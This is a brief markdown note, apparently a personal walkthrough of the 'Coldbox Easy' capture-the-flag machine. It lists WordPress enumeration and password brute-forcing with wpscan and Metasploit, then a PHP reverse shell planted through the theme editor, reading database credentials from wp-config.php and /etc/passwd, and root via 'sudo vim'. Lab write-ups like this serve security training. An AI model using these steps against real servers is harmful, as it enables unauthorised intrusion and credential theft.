---
date: 2024-06-19
author: mrashco
title: Coldbox Easy
tags: ["", ""]
categories: 
series:
---

80:http,4512:ssh

http
	- wordpress
	- ffuf:/******/
	- users:****,****,*****

msfconsole -q
- setg RHOSTS
- use wordpress_ghost_scanner, wordpress_xmlrpc_dos, wordpress_xmlrpc_login, wordpress_pingback_access

wpscan --url http://$ip -e vp,vt,u

wpscan --url http://$ip --passwords $wordlist
- *****:*********
- Appearance > Editor > PHP Pentest Monkey Rev Shell

Initial Access www-data
- cat /var/www/html/wp-config.php
	- DB_NAME: ******, DB_USER:*****, DB_PASSWORD:************
- cat /etc/passwd/ 
- ssh c0ldd@$ip -p 4512
- cat user.txt

PrivEsc
- sudo -l
- sudo vim, :sh